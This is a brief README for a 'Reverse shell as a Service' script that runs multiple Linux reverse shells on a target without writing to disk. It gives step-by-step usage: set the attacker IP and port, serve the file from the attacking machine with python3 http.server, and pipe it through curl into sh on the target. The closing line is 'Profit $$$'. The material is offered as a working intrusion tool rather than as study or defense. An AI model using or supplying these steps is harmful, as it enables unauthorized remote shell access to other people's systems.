# RaaS
Reverse shell as a Service script that executes all the different reverse shells on Linux systems without touching disk on the target system.

# Usage
1. Change IP and PORT variables accordingly

2. Host the file on your attacking system

   $ python3 -m http.server 8080

3. Grab the file using curl and execute it directly

   $ curl http://127.0.0.1:8080 | sh

4. Profit $$$
